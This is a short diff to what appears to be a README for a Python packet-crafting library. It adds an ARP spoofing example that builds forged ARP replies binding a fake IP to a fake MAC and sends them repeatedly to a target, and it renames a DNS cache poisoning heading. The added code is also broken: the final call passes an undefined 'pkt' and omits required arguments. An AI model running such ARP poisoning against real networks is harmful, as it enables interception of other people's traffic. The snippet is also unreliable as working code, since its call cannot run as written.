@@ -99,7 +99,14 @@ print(res)
 #### ARP Spoofing/Cache Poisoning
 ```python
 from All import *
-# Example TBC
+
+def poison(target_ip, target_mac, fake_ip, fake_mac, count=50):
+    pkt = Ether(src=fake_mac)/ARP(hwsrc=fake_mac, psrc=fake_ip, hwdst=target_mac, pdst=target_ip, opcode=2)
+    for _ in range(count):
+        send(pkt)
+
+poison(pkt, count=50)
+
 ```
 
 #### DNS Amplification
@@ -109,7 +116,7 @@ from All import *
 ```
     
 
-#### DNS Cache Poisoning
+#### Generating DNS Responses (Can be used for Cache Poisoning)
 ```python
 from All import *
 # Example TBC
